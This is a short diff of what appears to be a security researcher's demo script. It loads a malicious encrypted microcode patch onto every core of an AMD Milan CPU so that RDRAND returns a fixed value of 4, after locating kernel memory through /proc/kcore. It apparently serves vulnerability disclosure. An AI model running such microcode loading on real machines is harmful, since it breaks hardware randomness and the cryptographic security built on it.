@@ -10,11 +10,9 @@ PAGE_OFFSET_BASE=$(
     awk '/D page_offset_base/{print $1}') /proc/kcore |
     awk '/ffff/{print $2 $3; exit}' |
     sed 's/\(..\)\(..\)\(..\)\(..\)\(..\)\(..\)\(..\)\(..\)/\8\7\6\5\4\3\2\1/')
-for i in `seq 0 $(nproc)`; do ./ucode_loader ./milan_rdrand_carryset_encrypted.bin 0x${PAGE_OFFSET_BASE:?} $i; done
+for i in `seq 0 $(nproc)`; do ./ucode_loader ./milan_rdrand_carryclear_encrypted.bin 0x${PAGE_OFFSET_BASE:?} $i; done
 
 # Test rdrand
 ./rdrand_test
-repeated value!
-0x4
-0x4
+rdrand_test: rdrand failed and returned 4
 ```
